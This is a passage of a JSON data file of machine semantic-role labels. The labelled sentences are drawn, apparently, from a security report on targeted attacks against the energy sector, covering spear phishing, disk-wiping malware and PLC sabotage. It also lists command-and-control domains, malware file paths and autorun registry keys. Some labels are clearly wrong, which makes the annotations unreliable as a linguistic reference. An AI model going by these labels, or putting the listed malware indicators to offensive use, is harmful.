{"text": "computers"}, "ARGM-TMP": {"text": "whenever the engineer exchanged the project files"}}, "exchanged": {"ARGM-TMP": {"text": "whenever"}, "ARG0": {"text": "the engineer"}, "V": {"text": "exchanged", "index": 10}, "ARG1": {"text": "the project files"}}}, " This could allow the malware to be\nmanually introduced to the destination network, without the knowledge of the carrier, essentially jumping air gaps\ninto isolated networks": {"could": {"V": {"text": "could", "index": 1}}, "allow": {"ARG0": {"text": "This"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "allow", "index": 2}, "ARG1": {"text": "the malware to be manually introduced to the destination network , without the knowledge of the carrier , essentially jumping air gaps into isolated networks"}}, "be": {"V": {"text": "be", "index": 6}}, "introduced": {"ARG1": {"text": "the malware"}, "ARGM-MNR": {"text": "manually/ without the knowledge of the carrier"}, "V": {"text": "introduced", "index": 8}, "ARG2": {"text": "to the destination network"}}, "jumping": {"ARG0": {"text": "the malware"}, "ARGM-ADV": {"text": "essentially"}, "V": {"text": "jumping", "index": 22}, "ARG1": {"text": "air gaps"}, "ARG4": {"text": "into isolated networks"}}}, " This allowed them to move on to other internal computers using the gathered passwords": {"allowed": {"ARG0": {"text": "This"}, "V": {"text": "allowed", "index": 1}, "ARG1": {"text": "them to move on to other internal computers using the gathered passwords"}}, "move": {"ARG1": {"text": "them"}, "V": {"text": "move", "index": 4}, "ARGM-DIR": {"text": "on"}, "ARG2": {"text": "to other internal computers"}, "ARGM-MNR": {"text": "using the gathered passwords"}}, "using": {"ARG0": {"text": "them"}, "V": {"text": "using", "index": 10}, "ARG1": {"text": "the gathered passwords"}}, "gathered": {"V": {"text": "gathered", "index": 12}, "ARG1": {"text": "passwords"}}}, " The attack was carried out over eight days and used the same infected Microsoft\n   Word document in every instance": {"was": {"V": {"text": "was", "index": 2}}, "carried": {"ARG1": {"text": "The attack"}, "V": {"text": "carried", "index": 3}, "ARGM-TMP": {"text": "over eight days"}}, "used": {"ARG0": {"text": "The attack"}, "V": {"text": "used", "index": 9}, "ARG1": {"text": "the same infected Microsoft Word document"}, "ARGM-LOC": {"text": "in every instance"}}}, " The back door provided full access to the\n    compromised computers": {"provided": {"ARG0": {"text": "The back door"}, "V": {"text": "provided", "index": 3}, "ARG1": {"text": "full access"}, "ARG2": {"text": "to the compromised computers"}}, "compromised": {"V": {"text": "compromised", "index": 8}, "ARG1": {"text": "computers"}}}, "\n</section>\n<section>\n  <heading>2003</heading>\n    In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours\n    due to a Slammer worm infection": {"went": {"ARGM-TMP": {"text": "In 2003/ for several hours"}, "ARG1": {"text": "the safety monitoring system of the Ohio nuclear power plant"}, "ARGM-ADV": {"text": "apparently"}, "V": {"text": "went", "index": 13}, "ARGM-CAU": {"text": "due to a Slammer worm infection"}}}, "\n\n   As an example, the subject line \u201cWage Data 2012\u201d was used in 944 emails, sent from 26 different email addresses\n   to targets in nine different sectors": {"was": {"V": {"text": "was", "index": 12}}, "used": {"ARGM-ADV": {"text": "As an example"}, "ARG1": {"text": "the subject line \u201c Wage Data 2012 \u201d"}, "V": {"text": "used", "index": 13}, "ARGM-LOC": {"text": "in 944 emails"}, "C-ARG1": {"text": "sent from 26 different email addresses to targets in nine different sectors"}}, "sent": {"ARGM-ADV": {"text": "As an example"}, "ARG1": {"text": "the subject line \u201c Wage Data 2012 \u201d"}, "V": {"text": "sent", "index": 18}, "ARG2": {"text": "from 26 different email addresses/ to targets in nine different sectors"}}}, " By using IP address filters before infecting\nany visitor of such sites, the attacker can reduce the number of infected systems and bring it to a manageable\nquantity which can be assessed manually at another time": {"using": {"V": {"text": "using", "index": 1}, "ARG1": {"text": "IP address filters"}, "ARGM-TMP": {"text": "before infecting any visitor of such sites"}, "ARG0": {"text": "the attacker"}}, "infecting": {"V": {"text": "infecting", "index": 6}, "ARG1": {"text": "any visitor of such sites"}, "ARG0": {"text": "the attacker"}}, "can": {"V": {"text": "can", "index": 15}}, "reduce": {"ARGM-MNR": {"text": "By using IP address filters before infecting any visitor of such sites"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "reduce", "index": 16}, "ARG1": {"text": "the number of infected systems"}}, "infected": {"V": {"text": "infected", "index": 20}, "ARG1": {"text": "systems"}}, "bring": {"ARGM-MNR": {"text": "By using IP address filters before infecting any visitor of such sites"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "bring", "index": 23}, "ARG1": {"text": "it"}, "ARG2": {"text": "to a manageable quantity which can be assessed manually at another time"}}, "can_2": {"V": {"text": "can", "index": 30}}, "be": {"V": {"text": "be", "index": 31}}, "assessed": {"ARG1": {"text": "a manageable quantity"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "assessed", "index": 32}, "ARGM-MNR": {"text": "manually"}, "ARGM-TMP": {"text": "at another time"}}}, " The last C&C server has been used since 2010 in similar attacks\nagainst other companies": {"has": {"V": {"text": "has", "index": 4}}, "been": {"V": {"text": "been", "index": 5}}, "used": {"ARG1": {"text": "The last C&C server"}, "V": {"text": "used", "index": 6}, "ARGM-TMP": {"text": "since 2010"}, "ARG2": {"text": "in similar attacks against other companies"}}}, " This allowed the attacker to find and extract valuable\n  information": {"allowed": {"ARG0": {"text": "This"}, "V": {"text": "allowed", "index": 1}, "ARG1": {"text": "the attacker to find and extract valuable information"}}, "find": {"ARG0": {"text": "the attacker"}, "V": {"text": "find", "index": 5}, "ARG1": {"text": "valuable information"}}, "extract": {"ARG0": {"text": "the attacker"}, "V": {"text": "extract", "index": 7}, "ARG1": {"text": "valuable information"}}}, " Once they had control over the server they used common hacking tools to harvest local\n\n\n\n\n                                        <footer>      Page 11</footer>\n\f                                                           <header>     Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n  passwords, dump password hashes, sniff authentication messages and exploit internal active directory\n  configuration": {"had": {"ARG0": {"text": "they"}, "V": {"text": "had", "index": 2}, "ARG1": {"text": "control over the server"}}, "used": {"ARGM-TMP": {"text": "Once they had control over the server"}, "ARG0": {"text": "they"}, "V": {"text": "used", "index": 8}, "ARG1": {"text": "common hacking tools"}, "ARG2": {"text": "to harvest local passwords , dump password hashes ,"}, "ARGM-PRD": {"text": "sniff authentication messages and exploit internal active directory configuration"}}, "harvest": {"ARG0": {"text": "they"}, "V": {"text": "harvest", "index": 13}, "ARG1": {"text": "local passwords"}}, "dump": {"ARG0": {"text": "they"}, "V": {"text": "dump", "index": 17}, "ARG1": {"text": "password hashes , sniff authentication messages and exploit internal active directory configuration"}}, "sniff": {"ARGM-TMP": {"text": "Once they had control over the server"}, "ARG0": {"text": "they"}, "V": {"text": "sniff", "index": 21}, "ARG1": {"text": "authentication messages"}}, "exploit": {"ARGM-TMP": {"text": "Once"}, "ARG0": {"text": "they"}, "V": {"text": "exploit", "index": 25}, "ARG1": {"text": "internal active directory configuration"}}}, "\n\nOne method which is gaining more\nrelevance is the hijacking of local\nsoftware distribution systems for\nfurther distribution": {"is": {"V": {"text": "is", "index": 3}}, "gaining": {"ARG1": {"text": "One method"}, "R-ARG1": {"text": "which"}, "V": {"text": "gaining", "index": 4}}, "is_2": {"ARG1": {"text": "One method which is gaining more relevance"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "the hijacking of local software distribution systems for further distribution"}}}, " At the end Disttrack finishes the computer off by wiping the\n  master boot record with the same data": {"finishes": {"ARGM-TMP": {"text": "At the end Disttrack"}, "V": {"text": "finishes", "index": 4}, "ARG1": {"text": "the computer"}, "ARGM-MNR": {"text": "by wiping the master boot record with the same data"}}, "wiping": {"V": {"text": "wiping", "index": 9}, "ARG1": {"text": "the master boot record"}, "ARG2": {"text": "with the same data"}}}, " Although wiping is also frequently used to destroy evidence of the attack and make forensics\n  more difficult": {"wiping": {"V": {"text": "wiping", "index": 1}}, "is": {"V": {"text": "is", "index": 2}, "ARGM-TMP": {"text": "frequently"}}, "used": {"ARGM-DIS": {"text": "also"}, "ARGM-TMP": {"text": "frequently"}, "V": {"text": "used", "index": 5}}, "destroy": {"V": {"text": "destroy", "index": 7}, "ARG1": {"text": "evidence of the attack"}}, "make": {"V": {"text": "make", "index": 13}, "ARG1": {"text": "forensics more difficult"}}}, " Once the victim installs the genuine looking\nupdate, the attacker effectively gains control over the computer": {"installs": {"ARG0": {"text": "the victim"}, "V": {"text": "installs", "index": 3}, "ARG1": {"text": "the genuine looking update"}}, "looking": {"ARG1": {"text": "genuine"}, "V": {"text": "looking", "index": 6}, "ARG0": {"text": "update"}}, "gains": {"ARGM-TMP": {"text": "Once the victim installs the genuine looking update"}, "ARG0": {"text": "the attacker"}, "ARGM-MNR": {"text": "effectively"}, "V": {"text": "gains", "index": 12}, "ARG1": {"text": "control over the computer"}}}, "\n\n    The malware itself drops a malicious Downloader \u201cclbcatq.dll\u201d into a newly created \u201cwuauclt\u201d directory, posing\n    as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious\n    code in Windows": {"drops": {"ARG0": {"text": "The malware itself"}, "V": {"text": "drops", "index": 3}, "ARG1": {"text": "a malicious Downloader \u201c clbcatq.dll \u201d into a newly created \u201c wuauclt \u201d directory , posing as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious code in Windows"}}, "created": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "created", "index": 13}, "ARG1": {"text": "\u201c wuauclt"}}, "posing": {"ARG0": {"text": "a malicious Downloader \u201c clbcatq.dll \u201d into a newly created \u201c wuauclt \u201d directory"}, "V": {"text": "posing", "index": 19}, "ARG1": {"text": "as Windows update and taking advantage of the DLL search order hijack weakness"}, "ARGM-PRP": {"text": "in order to load the malicious code in Windows"}}, "update": {"ARG0": {"text": "Windows"}, "V": {"text": "update", "index": 22}}, "taking": {"ARG0": {"text": "a malicious Downloader \u201c clbcatq.dll"}, "V": {"text": "taking", "index": 24}, "ARG1": {"text": "advantage"}, "ARG2": {"text": "of the DLL search order hijack weakness"}, "ARGM-PRP": {"text": "in order to load the malicious code in Windows"}}, "load": {"V": {"text": "load", "index": 36}, "ARG2": {"text": "the malicious code"}, "ARG1": {"text": "in Windows"}}}, " Once the attackers have\nsuccessfully managed to create\nand distribute their own package,       \nthey can easily infect all connected\nsystems at once": {"have": {"V": {"text": "have", "index": 3}}, "managed": {"ARG0": {"text": "the attackers"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "managed", "index": 5}, "ARG1": {"text": "to create and distribute their own package"}}, "create": {"ARG0": {"text": "the attackers"}, "V": {"text": "create", "index": 7}, "ARG1": {"text": "their own package"}}, "distribute": {"ARG0": {"text": "the attackers"}, "V": {"text": "distribute", "index": 9}, "ARG1": {"text": "their own package"}}, "can": {"ARGM-TMP": {"text": "Once the attackers have successfully managed to create and distribute their own package/ at once"}, "ARG0": {"text": "they"}, "V": {"text": "can", "index": 15}, "ARGM-MNR": {"text": "easily"}, "ARG1": {"text": "infect all connected systems"}}, "infect": {"ARGM-TMP": {"text": "Once the attackers have successfully managed to create and distribute their own package/ at once"}, "ARG0": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "ARGM-MNR": {"text": "easily"}, "V": {"text": "infect", "index": 17}, "ARG1": {"text": "all connected systems"}}}, " It reports the\n  domain name, IP address and number of files overwritten": {"reports": {"ARG0": {"text": "It"}, "V": {"text": "reports", "index": 1}, "ARG1": {"text": "the domain name , IP address and number of files overwritten"}}, "overwritten": {"ARG1": {"text": "of files"}, "V": {"text": "overwritten", "index": 12}}}, " A few days later the group resumed the watering hole attack again,\nthis time using a different exploit": {"resumed": {"ARGM-TMP": {"text": "A few days later/ again/ this time"}, "ARG0": {"text": "the group"}, "V": {"text": "resumed", "index": 6}, "ARG1": {"text": "the watering hole attack"}, "ARGM-PRD": {"text": "using a different exploit"}}, "watering": {"V": {"text": "watering", "index": 8}, "ARG0": {"text": "hole"}}, "using": {"ARG0": {"text": "the group"}, "ARGM-TMP": {"text": "this time"}, "V": {"text": "using", "index": 15}, "ARG1": {"text": "a different exploit"}}}, " In addition, it is able to infect Step7\n  project files, which are used to control Programmable Logic Controllers (PLCs)": {"is": {"ARGM-DIS": {"text": "In addition"}, "ARG1": {"text": "it"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "able to infect Step7 project files , which are used to control Programmable Logic Controllers ( PLCs )"}}, "infect": {"ARG0": {"text": "it"}, "V": {"text": "infect", "index": 7}, "ARG1": {"text": "Step7 project files , which are used to control Programmable Logic Controllers ( PLCs )"}}, "are": {"V": {"text": "are", "index": 13}}, "used": {"R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 14}, "ARG2": {"text": "to control Programmable Logic Controllers ( PLCs )"}}, "control": {"ARG0": {"text": "which"}, "V": {"text": "control", "index": 16}, "ARG1": {"text": "Programmable Logic Controllers ( PLCs )"}}}, " Number of emails targeting the company per day</caption>\nThe spear phishing emails came from 234 spoofed addresses": {"targeting": {"ARG0": {"text": "emails"}, "V": {"text": "targeting", "index": 3}, "ARG1": {"text": "the company"}, "ARGM-TMP": {"text": "per day"}}, "phishing": {"V": {"text": "phishing", "index": 10}, "ARG1": {"text": "emails"}}, "came": {"ARG1": {"text": "The spear phishing emails"}, "V": {"text": "came", "index": 12}, "ARG2": {"text": "from 234 spoofed addresses"}}, "spoofed": {"ARG2": {"text": "234"}, "V": {"text": "spoofed", "index": 15}, "ARG3": {"text": "addresses"}}}, "\n\n    At the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack": {"was": {"V": {"text": "was", "index": 10}}, "targeted": {"ARGM-TMP": {"text": "At the beginning of 2003"}, "ARG2": {"text": "a marine terminal in Venezuela"}, "V": {"text": "targeted", "index": 11}, "ARG1": {"text": "by a sabotage attack"}}}, " The final stage is capture and exfiltration, where the valuable\n    information is copied and sent back to the attacker": {"is": {"ARG1": {"text": "The final stage"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "capture"}}, "is_2": {"V": {"text": "is", "index": 12}}, "copied": {"ARGM-LOC": {"text": "exfiltration"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "the valuable information"}, "V": {"text": "copied", "index": 13}}, "sent": {"ARGM-LOC": {"text": "exfiltration"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "the valuable information"}, "V": {"text": "sent", "index": 15}, "ARG2": {"text": "back to the attacker"}}}, " These can be performed either at the same\nphysical location, posing as a genuine Wi-Fi hotspot or through supply chain attacks": {"can": {"V": {"text": "can", "index": 1}}, "be": {"V": {"text": "be", "index": 2}}, "performed": {"ARG1": {"text": "These"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "performed", "index": 3}, "ARGM-EXT": {"text": "either"}, "ARGM-LOC": {"text": "at the same physical location , posing"}, "ARGM-MNR": {"text": "as a genuine Wi - Fi hotspot or through supply chain attacks"}}, "posing": {"ARG0": {"text": "These"}, "V": {"text": "posing", "index": 11}, "ARG1": {"text": "as a genuine Wi - Fi hotspot or through supply chain attacks"}}}, " The later version of the threat focused on the S7-315 PLCs,\n  manipulating the spinning frequency of the rotating motors": {"focused": {"ARG0": {"text": "The later version of the threat"}, "V": {"text": "focused", "index": 6}, "ARG2": {"text": "on the S7 - 315 PLCs"}, "ARGM-PRD": {"text": "manipulating the spinning frequency of the rotating motors"}}, "manipulating": {"ARG0": {"text": "The later version of the threat focused on the S7 - 315 PLCs"}, "V": {"text": "manipulating", "index": 14}, "ARG1": {"text": "the spinning frequency of the rotating motors"}}}, "\nSimple system commands can help the attacker to learn about installed security tools, saved links to internal\n\n\n\n\n                                      <footer>               Page 26</footer>\n\f                                                    <header>           Targeted Attacks Against the Energy Sector</header>\n\n\n\n\nplatforms and local address books": {"can": {"V": {"text": "can", "index": 3}, "ARG1": {"text": "help the attacker to learn about installed security tools , saved links to internal platforms and local address books"}}, "help": {"ARG0": {"text": "Simple system commands"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "help", "index": 4}, "ARG1": {"text": "the attacker to learn about installed security tools , saved links to internal platforms and local address books"}}, "learn": {"ARG0": {"text": "the attacker"}, "V": {"text": "learn", "index": 8}, "ARG1": {"text": "about installed security tools , saved links to internal platforms and local address books"}}, "saved": {"V": {"text": "saved", "index": 14}, "ARG1": {"text": "links"}}}, "\n\nIn this phase the interesting data is gathered and sent back to the attackers": {"is": {"V": {"text": "is", "index": 6}}, "gathered": {"ARGM-LOC": {"text": "In this phase"}, "ARG1": {"text": "the interesting data"}, "V": {"text": "gathered", "index": 7}}, "sent": {"ARGM-TMP": {"text": "In this phase"}, "ARG1": {"text": "the interesting data"}, "V": {"text": "sent", "index": 9}, "ARG2": {"text": "back to the attackers"}}}, "\n<list>\n\u2022\t updates.zyns.com\n\u2022\t amazoaws.dyndns-office.com\n\u2022\t msupdate.3utilities.com\n</list>\n\n\n\n\n                                           <footer> Page 15</footer>\n\f                                                               <header>    Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n    The chosen names of the C&C server domains imitates legitimate services in a bid to be overlooked by the system\n    administrators when checking their logs": {"chosen": {"V": {"text": "chosen", "index": 1}, "ARG1": {"text": "names"}}, "domains": {"ARG0": {"text": "The chosen names of"}, "ARG2": {"text": "the C&C server/ in a bid to be overlooked by the system administrators when checking their logs"}, "V": {"text": "domains", "index": 7}, "ARG1": {"text": "imitates legitimate services"}}, "imitates": {"ARG0": {"text": "The chosen names of the C&C server domains"}, "V": {"text": "imitates", "index": 8}, "ARG1": {"text": "legitimate services"}, "ARGM-PRP": {"text": "in a bid to be overlooked by the system administrators"}, "ARGM-TMP": {"text": "when checking their logs"}}, "be": {"V": {"text": "be", "index": 15}}, "overlooked": {"V": {"text": "overlooked", "index": 16}, "ARG0": {"text": "by the system administrators"}}, "checking": {"ARGM-TMP": {"text": "when"}, "V": {"text": "checking", "index": 22}, "ARG1": {"text": "their logs"}}}, " However, sabotage attacks that damage equipment\n    are definitely possible, as has already been demonstrated": {"are": {"ARG1": {"text": "damage equipment"}, "V": {"text": "are", "index": 7}, "ARGM-ADV": {"text": "definitely/ as has already been demonstrated"}, "ARG2": {"text": "possible"}}, "has": {"V": {"text": "has", "index": 12}}, "been": {"V": {"text": "been", "index": 14}}, "demonstrated": {"ARGM-TMP": {"text": "already"}, "V": {"text": "demonstrated", "index": 15}}}, " There have\n    already been proof of concept attacks that demonstrate how smart meters could be manipulated to send\n    back false information or report incorrect billing IDs, leading to power theft": {"have": {"V": {"text": "have", "index": 1}}, "been": {"ARGM-TMP": {"text": "already"}, "V": {"text": "been", "index": 3}, "ARG1": {"text": "proof of concept attacks that demonstrate how smart meters could be manipulated to send back false information or report incorrect billing IDs , leading to power theft"}}, "demonstrate": {"ARG0": {"text": "proof of concept attacks"}, "R-ARG0": {"text": "that"}, "V": {"text": "demonstrate", "index": 9}, "ARG1": {"text": "how smart meters could be manipulated to send back false information or report incorrect billing IDs , leading to power theft"}}, "could": {"V": {"text": "could", "index": 13}}, "be": {"V": {"text": "be", "index": 14}}, "manipulated": {"ARG1": {"text": "how smart meters"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "manipulated", "index": 15}, "ARG2": {"text": "to send back false information or report incorrect billing IDs , leading to power theft"}}, "send": {"V": {"text": "send", "index": 17}, "ARGM-DIR": {"text": "back"}, "ARG1": {"text": "false information"}}, "report": {"V": {"text": "report", "index": 22}, "ARG1": {"text": "incorrect billing IDs"}}, "leading": {"V": {"text": "leading", "index": 27}, "ARG2": {"text": "to power theft"}}}, "\n\nAt the end of the discovery phase the attackers should know the internals of the infected networks and have\nidentified systems with interesting data or with connected industrial control systems": {"should": {"V": {"text": "should", "index": 9}}, "know": {"ARGM-TMP": {"text": "At the end of the discovery phase"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "know", "index": 10}, "ARG1": {"text": "the internals of the infected networks"}}, "have": {"V": {"text": "have", "index": 18}}, "identified": {"ARGM-TMP": {"text": "At the end of the discovery phase"}, "ARG0": {"text": "the attackers"}, "V": {"text": "identified", "index": 19}, "ARG1": {"text": "systems"}, "ARG2": {"text": "with interesting data or with connected industrial control systems"}}}, " The module then drops a legitimate and digitally signed device driver that\n  provides low level disk access from user space": {"drops": {"ARG0": {"text": "The module"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "drops", "index": 3}, "ARG1": {"text": "a legitimate and digitally signed device driver that provides low level disk access from user space"}}, "signed": {"V": {"text": "signed", "index": 8}, "ARG1": {"text": "device driver"}}, "provides": {"ARG0": {"text": "a legitimate and digitally signed device driver"}, "R-ARG0": {"text": "that"}, "V": {"text": "provides", "index": 12}, "ARG1": {"text": "low level disk access from user space"}}}, "\n </cover>\n\f                                                               <header>     Targeted Attacks Against the Energy Sector</header>\n\n\n<section>\n\n<heading>Spear phishing attacks in the energy sector</heading>\n    Spear phishing is, along with watering hole attacks, one of the most common attack vectors used to\n    attack companies": {"is": {"ARG1": {"text": "Spear phishing"}, "V": {"text": "is", "index": 2}, "ARGM-ADV": {"text": "along with watering hole attacks"}, "ARG2": {"text": "one of the most common attack vectors used to attack companies"}}, "watering": {"V": {"text": "watering", "index": 6}, "ARG1": {"text": "hole attacks"}}, "used": {"ARG1": {"text": "the most common attack vectors"}, "V": {"text": "used", "index": 17}, "ARG2": {"text": "to attack companies"}}, "attack": {"ARG0": {"text": "the most common attack vectors"}, "V": {"text": "attack", "index": 19}, "ARG1": {"text": "companies"}}}, "\nOften small scripts or even manual commands are used to comb through local files and create network mappings": {"are": {"V": {"text": "are", "index": 7}}, "used": {"ARGM-TMP": {"text": "Often"}, "ARG1": {"text": "small scripts or even manual commands/ to comb through local files and create network mappings"}, "V": {"text": "used", "index": 8}}, "comb": {"ARG0": {"text": "small scripts or even manual commands"}, "V": {"text": "comb", "index": 10}, "ARG1": {"text": "through local files"}}, "create": {"ARG0": {"text": "small scripts or even manual commands"}, "V": {"text": "create", "index": 15}, "ARG1": {"text": "network mappings"}}}, " Sometimes a regular off-the-shelf back door Trojan is used": {"is": {"V": {"text": "is", "index": 11}}, "used": {"ARGM-TMP": {"text": "Sometimes"}, "ARG1": {"text": "a regular off - the - shelf back door Trojan"}, "V": {"text": "used", "index": 12}}}, "\n\n  Part of the malware code was signed with stolen digital certificates making it harder to detect by security tools": {"was": {"V": {"text": "was", "index": 5}}, "signed": {"ARG1": {"text": "Part of the malware code"}, "V": {"text": "signed", "index": 6}, "ARG2": {"text": "with stolen digital certificates making it harder to detect by security tools"}}, "stolen": {"V": {"text": "stolen", "index": 8}, "ARG1": {"text": "digital certificates"}}, "making": {"ARG0": {"text": "stolen digital certificates"}, "V": {"text": "making", "index": 11}, "ARG1": {"text": "it harder to detect by security tools"}}, "detect": {"ARG1": {"text": "stolen"}, "V": {"text": "detect", "index": 15}, "ARG0": {"text": "by security tools"}}}, "\n</section>\n<section>\n  <heading>2008</heading>\n    In 2008, Tom Donahue, a senior Central Intelligence Agency (CIA) official told a meeting of utility company\n    representatives that cyberattacks had taken out power equipment in multiple cities outside the United States": {"told": {"ARGM-TMP": {"text": "In 2008"}, "ARG0": {"text": "Tom Donahue , a senior Central Intelligence Agency ( CIA ) official"}, "V": {"text": "told", "index": 15}, "ARG2": {"text": "a meeting of utility company representatives"}, "ARG1": {"text": "that cyberattacks had taken out power equipment in multiple cities outside the United States"}}, "had": {"V": {"text": "had", "index": 24}}, "taken": {"ARG0": {"text": "cyberattacks"}, "V": {"text": "taken", "index": 25}, "ARG1": {"text": "power equipment in multiple cities"}, "ARGM-LOC": {"text": "outside the United States"}}}, " It is unknown if the attackers successfully retrieved the information\n    they were seeking, if they installed other back door Trojans or gained passwords that allowed them to directly\n    access the computers, or if they have given up on the target": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "unknown"}, "ARGM-ADV": {"text": "if the attackers successfully retrieved the information they were seeking/ if they installed other back door Trojans or gained passwords that allowed them to directly access the computers , or if they have given up on the target"}}, "retrieved": {"ARG0": {"text": "the attackers"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "retrieved", "index": 7}, "ARG1": {"text": "the information they were seeking"}}, "were": {"V": {"text": "were", "index": 11}}, "seeking": {"ARG1": {"text": "the information"}, "ARG0": {"text": "they"}, "V": {"text": "seeking", "index": 12}}, "installed": {"ARG0": {"text": "they"}, "V": {"text": "installed", "index": 16}, "ARG1": {"text": "other/ Trojans"}, "ARG2": {"text": "back door"}}, "gained": {"ARG0": {"text": "they"}, "V": {"text": "gained", "index": 22}, "ARG1": {"text": "passwords that allowed them to directly access the computers , or if they have given up on the target"}}, "allowed": {"ARG0": {"text": "passwords"}, "R-ARG0": {"text": "that"}, "V": {"text": "allowed", "index": 25}, "ARG1": {"text": "them to directly access the computers"}}, "access": {"ARG0": {"text": "them"}, "ARGM-MNR": {"text": "directly"}, "V": {"text": "access", "index": 29}, "ARG1": {"text": "the computers"}}, "have": {"V": {"text": "have", "index": 36}}, "given": {"ARG0": {"text": "they"}, "V": {"text": "given", "index": 37}, "ARGM-LOC": {"text": "on the target"}}}, " These attacks can include nonspecific data\n    breaches where employee or customer records get stolen, as happened to the US Department of Energy in July\n    2013": {"can": {"V": {"text": "can", "index": 2}}, "include": {"ARG2": {"text": "These attacks"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "include", "index": 3}, "ARG1": {"text": "nonspecific data breaches where employee or customer records get stolen"}, "ARGM-ADV": {"text": "as happened to the US Department of Energy in July 2013"}}, "get": {"ARGM-LOC": {"text": "where"}, "ARG1": {"text": "employee or customer records"}, "V": {"text": "get", "index": 12}, "ARG2": {"text": "stolen"}}, "stolen": {"ARGM-LOC": {"text": "where"}, "ARG1": {"text": "employee or customer records"}, "V": {"text": "stolen", "index": 13}}, "happened": {"ARG1": {"text": "employee or customer records"}, "V": {"text": "happened", "index": 16}, "ARG2": {"text": "to the US Department of Energy"}, "ARGM-TMP": {"text": "in July 2013"}}}, " This is followed by the incursion phase of\n    breaking in and compromising computers": {"is": {"V": {"text": "is", "index": 1}}, "followed": {"ARG2": {"text": "This"}, "V": {"text": "followed", "index": 2}, "ARG1": {"text": "by the incursion phase of breaking in and compromising computers"}}, "breaking": {"V": {"text": "breaking", "index": 8}}, "compromising": {"V": {"text": "compromising", "index": 11}, "ARG1": {"text": "computers"}}}, "\n\nFirst, the program nvidrv adds itself to autorun:\n<list>\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run under name \u201cUpdAdbreader\u201d\n</list>\n\fIt also creates a series of registry keys that the individual programs use to communicate:\n\nRegistry keys and programs using them:\n<list>\nrundl132.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K6F-DKV8J-FKVJI-\nGVKBU\\6nvisdvr.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K4F-DKV8J-FKVJI-\nGVKBU\\4GoogleUpate.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K3F-DKV8J-FKVJI-\nGVKBU\\3AdbrRader.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K2F-DKV8J-FKVJI-\nGVKBU\\2nvidrv.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K1F-DKV8J-FKVJI-GVKBU\\1\nSets name \u201c1\u201d to StartupInfo structure as a string, e.g": {"adds": {"ARG0": {"text": "the program nvidrv"}, "V": {"text": "adds", "index": 5}, "ARG1": {"text": "itself"}, "ARG2": {"text": "to autorun"}}}, "\n\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions,\nincluding:\n<list>\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\n</list>\n</section>\n<section>\n<heading>Program Sequence</heading>\n\nThe program sequence of data collection and sending is somewhat unusual, with each program performing a single task\nand communicating via markers left in the registry": {"writes": {"ARG0": {"text": "The AdobeR1 file"}, "V": {"text": "writes", "index": 3}, "ARG1": {"text": "a series of executable files that perform information collection and communication functions , including : The program sequence of data collection and sending is somewhat unusual , with each program performing a single task and communicating via markers left in the registry"}}, "perform": {"ARG0": {"text": "executable files"}, "R-ARG0": {"text": "that"}, "V": {"text": "perform", "index": 10}, "ARG1": {"text": "information collection and communication functions"}}, "including": {"ARG2": {"text": "information collection and communication functions"}, "V": {"text": "including", "index": 17}, "ARG1": {"text": "The program sequence of data collection and sending is somewhat unusual , with each program performing a single task and communicating via markers left in the registry"}}, "is": {"ARG1": {"text": "The program sequence of data collection and sending"}, "V": {"text": "is", "index": 27}, "ARG2": {"text": "somewhat unusual"}, "ARGM-MNR": {"text": "with each program performing a single task and communicating via markers left in the registry"}}, "performing": {"ARG0": {"text": "each 